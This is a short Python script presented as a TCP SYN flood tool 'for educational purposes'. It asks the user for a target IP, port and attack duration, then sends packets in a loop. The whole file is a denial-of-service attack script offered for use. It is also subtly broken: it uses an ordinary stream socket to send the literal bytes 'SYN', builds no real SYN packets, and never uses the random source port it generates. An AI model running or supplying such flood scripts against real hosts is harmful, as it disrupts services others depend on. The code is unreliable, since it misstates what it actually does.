# TCP SYN Flood Script (For Educational Purposes Only)
import random
import socket
import time

target_ip = input("Enter the target IP address: ")  # Replace with the IP address of your target
target_port = int(input("Enter the target port: "))  # Replace with the port of your target service
duration = int(input("Enter the duration of the attack in seconds: "))  # Duration of the attack in seconds

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

timeout = time.time() + duration
sent_syn_packets = 0

print(
    f"Starting TCP SYN flood attack on {target_ip}:{target_port} for {duration} seconds..."
)

while True:
    if time.time() > timeout:
        break
    source_port = random.randint(1024, 65535)
    sock.sendto(b"SYN", (target_ip, target_port))
    sent_syn_packets += 1

print(f"Attack finished. Sent {sent_syn_packets} TCP SYN packets.")
sock.close()
